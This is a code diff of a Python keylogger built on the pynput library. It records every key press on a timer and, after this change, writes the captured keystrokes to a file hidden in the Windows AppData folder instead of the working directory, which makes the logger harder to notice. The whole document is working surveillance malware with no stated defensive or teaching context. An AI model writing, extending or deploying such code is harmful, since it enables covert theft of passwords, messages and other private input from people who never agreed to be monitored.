@@ -1,5 +1,6 @@
 import pynput.keyboard
 import threading
+import os
 
 
 class Keylogger:
@@ -30,9 +31,10 @@ class Keylogger:
         timer = threading.Timer(10, Keylogger.report)
         timer.start()
 
-    def main(self):
+    def start(self):
         listener = pynput.keyboard.Listener(on_press=Keylogger.process_keys)
         with listener:
-            with open("keylogger.txt", "a") as file:
+            path = os.environ["appdata"] + "\\keylogger.txt"
+            with open(path, "a") as file:
                 Keylogger.report(file)
                 listener.join()
